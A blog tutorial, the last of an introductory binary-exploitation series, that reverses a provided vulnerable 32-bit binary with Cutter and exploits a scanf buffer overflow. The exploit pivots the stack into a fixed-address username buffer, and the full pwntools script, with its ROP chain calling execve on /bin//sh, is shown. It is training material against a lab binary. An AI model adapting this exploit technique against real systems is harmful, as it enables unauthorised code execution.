---
author: "Laluka"
title: "PWN 4/4 : Stack Pivot ToZeMoon !"
slug: "pwn_4of4_stak_pivot_to_ze_moon"
date: 2018-05-10
status: "translated"
description: "The basics of binary operation are normally acquired, let's go for a practical operation with a stack pivot!"
---

> Small edit after the initial publication of the articles:

> These four articles lead me to give an "pwn introductory" conference at the HitchHack 2018. It summarizes the first 3 articles but goes less into detail. If this format suits you better, the slides are downloadable [here](/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf) and the video (French only) here :

{{< youtube hmt8M9YLwTg >}}

## Pwn Road, last introductory article!

I promised you some heavy stuff for the final, and what is said, is due!

The exploit will not be very long, but here's the program: A nice technique, some reverse, and an open source tool that you'll dream of!

You who stood strong during the previous 3 articles, I hope you are still ready!

<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/lets_go.jpg" alt="lets_go" >


## Recon

The studied binary is downloadable [here](/hacking/pwn_4of4_stack_pivot/vuln) !

Hello little program, what do you do for a living?

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/recon.png" alt="recon" >

Meh, not much...

Let's take our first tool: Radare2!

I hesitated between presenting its command line interface, or its graphical interface. But there is so much development and effort done on their GUI that I want to present this version.

So I present you Cutter, based on radare2, which is a very advanced reverse engineering tool. For the record, radare2 is intended to be as standalone (independent) as possible, i.e. you can use it on a particular device / architecture, even if it does not have any tool / package preinstalled. All you have to do is recompile it in situ or cross-compile it. As a 'bonus', many classic admin-sys tools are integrated! A paradise for embded devices, remote control of a watch, phone, or whatever you like.

It is open source, and its developers are very active, so prefer an installation via their git... :)

Official website here: https://rada.re/r/

It's full of easter eggs, if you have time to waste, enjoy! ;)

I know that the screenshot is difficult to read in its normal size, but I uploaded the source resolution, you can (should) zoom as close as you want!

Sorry / Not sorry, your vision is now blurry! ``¯\_(ツ)_/¯``

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/cutter.png" alt="cutter" >

Brief presentation of the interface:

 * On the left:

The different functions of the program. We're lucky, the program isn't stripped, so it still contains the names of the functions. Otherwise, we would only have generic names that could not be used easily.

 * On the right:

Information on the line being inspected. Not very useful at the moment.

 * Up:

An overview of the program structure. Code, data, recognizable patterns for crypto,...

 * Down:

A console of logs (with already an easter egg!) and the different sections of the program and their information.

 * In the middle:

The analysis tool in use.

Here, the dashboard proudly tells us: Bruhhh, I looked a little bit, and you seeeee, I found that your target thereeee, well it's an ELF, in 32 bits, initially coded in C, without stack canary, without cryptographic protection, its stack is NX, the PIC is disabled. It is not stripped, also it's compiled in static! :D

Isn't it great all these information with just a finger snap!

So... Get it ?  °^°

<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/ffs.jpg" alt="ffs" >

A quick overview of the execution flow (from the main), still with Cutter :

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/graph_call.png" alt="graph_call" >

Way too lazy to analyze it in depth... Pseudo code please?

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pseudo_code.png" alt="pseudo_code" >

We immediately see that the decompilation is partial, we see a lot of interesting things, but we don't have a clear C code as we would like... Well, we'll deal with it!

There are many lines of code, so it's time to learn an effective way of looking for security breach in a general hacking way: Sources and Sinks!

A little ref to the [Live Overflow](https://www.youtube.com/watch?v=ZaOtY4i5w_U) youtube channel, it's GOLD. Everything he does (hacking, pwn, web, reverse, random,...) is of an incredible quality, and he just talked about the SoSi method, so have a look!

In short, what do we control (inputs), and what do we want to reach (dangerous functions).

Here, we want to make a buffer overflow. So we're looking for vulnerable functions and inputs.

 * Sources: admin name, room name, temperature

 * Sinks: scanf... scanf ? scanf!

scanf corresponds to "room name". Let's do a few tests just to be sure that we control the crash point:

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/crash.png" alt="crash" >

Crash confirmed!

Before looking for the offset, there is one more thing to look for, which will **MAYBEEEE** be useful later... Just saying... For the curious ones, it is in the first code screenshot, for the others, the reading continues:

*-[ SPOIL ]-*

We read the following code:

```
push 0x3ff // size: 1023
push obj.username // address: 0x80eb2c0 char * fgets(...) // user entry
```

In other words, the program will always put in the same place (0x80eb2c0) up to 1023 bytes entered by the user... Maybe it's legitimate... But it can be useful? Probably... Who knows! :)

Now, the offset!

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_create.png" alt="pattern_create" >

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_search.png" alt="pattern_search" >

The program crashes on a ret: Usual, classic, cool.

We do have ESP, good. Wait... What? We have ESP... + 4 ?

Yes, the famous pattern is cleverly formated, clever enough to be detected even if it has been altered (a bit)!

This means that between the time we overflow, and the time we execute the ret instruction, the stack (well, our ESP in the stack) has been altered.

But... We have ESP + 4? Yes. Do we know how to add up? Yes.

<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/coincidence.gif" alt="coincidence" >

I hope you're starting to see where we're going with this? :)

We know where to store bytes. We control EIP since we control ESP on a ret. We know the offset, and we know how to modify ESP so that it takes the value of our choice... Justwreckit!

That's the right time to announce you the technique we're going to use, a Stack Pivot!

We will rotate the execution of our program, making it believe that the stack is where the username is, which we can define as we wish, of course.

I pass the creation of the ropchain as it's exactly like in the previous article, we'll do our exploit right away:

```python
#!/usr/bin/env python2

from pwn import *

# Setting up
context.log_level = "debug"

ropchain = ''
ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
ropchain += p32(0x080ea340)  # @ .data
ropchain += p32(0x080bb696)  # popayloadeax ; ret
ropchain += '/bin'
ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
ropchain += p32(0x41414141)  # padding
ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
ropchain += p32(0x080ea344)  # @ .data + 4
ropchain += p32(0x080bb696)  # popayloadeax ; ret
ropchain += '//sh'
ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
ropchain += p32(0x41414141)  # padding
ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
ropchain += p32(0x080ea348)  # @ .data + 8
ropchain += p32(0x080545b0)  # xor eax, eax ; ret
ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
ropchain += p32(0x41414141)  # padding
ropchain += p32(0x080481a9)  # popayloadebx ; ret
ropchain += p32(0x080ea340)  # @ .data
ropchain += p32(0x080c18cc)  # popayloadecx ; ret
ropchain += p32(0x080ea348)  # @ .data + 8
ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
ropchain += p32(0x080ea348)  # @ .data + 8
ropchain += p32(0x080545b0)  # xor eax, eax ; ret
ropchain += p32(0x0807b64f) * 11 # inc eax ; ret
ropchain += p32(0x080494b1)  # int 0x80

p = process("./vuln")
p.recv()
p.sendline(ropchain)
p.recv()
"""
0x08048fc9 <+397>:	lea    esp,[ecx-0x4]
0x08048fcc <+400>:	ret
On ajoute donc 4 a user name pour compenser le -0x4
"""
usernameAddr = 0x80EB2C0
ESP = usernameAddr + 4 # Fix the offset before ret
p.sendline("1" * 28 + p32(ESP))
p.recv()
p.sendline("10")
p.recv()
p.interactive()
```

Let's run it, it would be crazy to see it working at the first time, wouldn't it? :O

<img class="img_full" src="/hacking/pwn_4of4_stack_pivot/run_exploit.png" alt="run_exploit" >

Bim, shell, first try, too IZI mannnn!

<img class="img_med" src="/hacking/pwn_4of4_stack_pivot/like_a_boss.jpg" alt="like_a_boss" >

Except... Except it's not as easy.

By reading an article like that, it doesn't seem that complex, a little bit messy, at most. Except that for each step, unless you are really good at it (Geluchat, Blackndoor, Pixis, Klaoude, Antoxyde, Ethnical, Reglisse...), it is hours, days (well, nights, we understand each other now ;) ) that are spend learning this. But trying hard to finally get there, what a satisfaction!

If you also want to get started, I recommend the excellent exercise suite [Protostar] (https://exploit-exercises.com/protostar/)

As well as the classic [root-me](https://www.root-me.org/) that I particularly like. Be careful though, this site will devour your nights... =]

But although I love this site, I don't think it very appropriate to discover the binary exploit. But for all the other categories of "classic" hacking, go for it, it's a blessed bread! ;)

That's how this pwn introduction ends, I hope you liked it and learned some things (at least a little? :D)

I am very, very happy with your many feedback!

Wishing you a happy and successful pwn,
